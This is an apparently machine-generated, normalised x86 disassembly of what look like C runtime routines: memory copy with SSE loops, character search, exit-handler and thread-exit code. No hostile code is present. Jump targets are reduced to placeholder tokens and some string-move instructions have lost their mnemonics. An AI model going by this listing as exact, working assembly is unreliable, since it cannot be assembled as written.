lea edx [ eax - 0x41 ]
cmp edx 0x5
ja r-xdata
add eax 0xffffffa9
jmp r-xdata
imul edi esi
push ebx
add edi eax
call sub_1000ac10
push ebx
call sub_100298f0
lea ecx [ eax - 0x30 ]
add esp 0x8
cmp ecx 0x9
ja r-xdata
mov ecx [ ecx * 8 + r--data ]
mov [ ebp - 0x4 ] ecx
cmp ecx 0xffffffff
je r-xdata
mov eax [ ecx * 8 + r--data ]
inc ecx
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
push esi
push ebx
call sub_10001000
mov eax edi
cdq
add esp 0x8
mov [ esi ] 0x4
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
add eax 0xffffffc9
cmp edi 0xd800
jl r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10058470
mov esi eax
add esp 0x4
test esi esi
je r-xdata
cmp eax edi
je r-xdata
xor ecx ecx
xor eax eax
cmp edi 0x10ffff
jle r-xdata
cmp edi 0xdfff
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] eax
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
push ebx
call sub_10001000
mov eax edi
cdq
add esp 0x8
mov [ esi ] 0x5
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
push edi
call sub_10019180
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10058470
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
push edi
push 0x5
push ebx
call sub_1007e800
add esp 0xc
mov [ ebp - 0x8 ] 0x0
cmp edi 0xb
jne r-xdata
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] 0xfffd
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
push ebx
call sub_10001000
mov eax edi
cdq
add esp 0x8
mov [ esi ] 0x5
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
mov eax [ ebp + 0xc ]
mov [ eax ] edi
mov eax [ ebp - 0x8 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1007ea80
push esi
push edi
xor edi edi
xor eax eax
jmp r-xdata
mov ecx [ eax + r--data ]
lea esi [ eax + r--data ]
mov eax [ esi + 0x4 ]
push 0x1
push eax
push ecx
push ebx
call sub_10034680
add esp 0x10
test eax eax
jne r-xdata
pop edi
mov eax esi
pop esi
retn
inc edi
mov eax edi
shl eax 0x4
cmp [ eax + r--data ] 0xffffffff
jne r-xdata
pop edi
xor eax eax
pop esi
retn
sub_1007ead0
push ebp
mov ebp esp
push ecx
push esi
push ebx
call sub_1005b7e0
mov esi eax
mov [ ebp - 0x4 ] esi
cmp eax 0x41
jl r-xdata
cmp eax 0x7a
jle r-xdata
lea ecx [ eax - 0x30 ]
cmp ecx 0x9
ja r-xdata
cmp eax 0x5a
jle r-xdata
push ebx
call sub_1000ac10
jmp r-xdata
cmp eax 0x3b
jne r-xdata
push ebx
call sub_100298f0
add esp 0x8
cmp eax 0x61
jl r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn
push edi
push ebx
call sub_1005b7e0
mov edx [ ebp + 0x8 ]
mov edi eax
push edx
sub edi esi
call sub_10058470
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
push ebx
call sub_10001000
mov eax [ ebp - 0x4 ]
add esp 0x8
mov [ esi ] 0x7
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edi
sub_1007eb60
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov ebx edi
call sub_1007ea80
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_1007ead0
push edi
mov esi eax
call sub_10047210
add esp 0x8
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
cmp [ eax + ecx - 0x1 ] 0x3b
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
mov ecx [ esi + 0xc ]
pop esi
mov [ eax + 0x4 ] ecx
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
call sub_10058470
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
push edi
call sub_100298f0
add esp 0x4
cmp eax 0x3d
je r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ eax ] ecx
mov edx [ esi + 0xc ]
pop esi
mov [ eax + 0x4 ] edx
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push ebx
push edi
call sub_10001000
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
add esp 0x8
mov [ ebx ] 0x6
mov [ ebx + 0x18 ] edx
mov [ ebx + 0x1c ] eax
push edi
call sub_10047210
add esp 0x4
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_100650a7
add esp 0x4
test eax eax
je r-xdata
sub_1007ec40
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1007ecc4 ]
jmp [ ecx * 4 + jump_table_1007ed44 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1007edb0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_1007ef4c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1007ee50 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007ef4c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1007edb0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1007ef4c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1007edb0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1007edb0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1007edb0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007ef4c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007ef4c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007ef4c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_1007efa1
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_10069c20
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1001f715
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1001f715
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_1007f098
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1004b450
call sub_1002be6a
push eax
call sub_100015e2
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
mov [ eax + 0x54 ] edx
mov edx [ ecx + 0x58 ]
mov [ eax + 0x58 ] edx
mov edx [ ecx + 0x4 ]
push ecx
mov [ eax + 0x4 ] edx
call sub_10061657
mov esi [ ebp + 0x8 ]
push esi
call sub_1002be6a
push eax
call sub_100637dc
test eax eax
jne r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call [ ExitThread@IAT ]
call sub_1007f057
sub_1007f0fd
push 0x20
push r--data
call sub_1007fad0
push 0x8
call sub_1002f3c9
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1007f228
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_1007fb15
retn
mov [ rw-data ] 0x1
push 0x8
call sub_10037434
pop ecx
push [ ebp + 0x8 ]
call sub_10067a82
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_10030bed
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_10030bed
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_1007f250
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_1007f310
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_1007f3bd
push 0xc
push r--data
call sub_1007fad0
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_10034b80
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_1003c067
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_1003c067
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_10034b80
push edi
push 0x0
push ebx
call sub_1003c067
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_1007fb15
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
sub_1007f4b3
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
[ edi ]
pop edi
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
leave
retn
push esi
call sub_1007fa40
pop ecx
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] ecx
cmp eax ecx
ja r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
leave
retn
mov [ ebp - 0x1c ] eax
sub_1007f530
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_1007f580
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1007f604 ]
jmp [ ecx * 4 + jump_table_1007f684 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1007f6f0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_1007f88c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1007f790 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007f88c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1007f6f0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1007f88c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1007f6f0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1007f6f0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1007f6f0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007f88c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007f88c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007f88c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
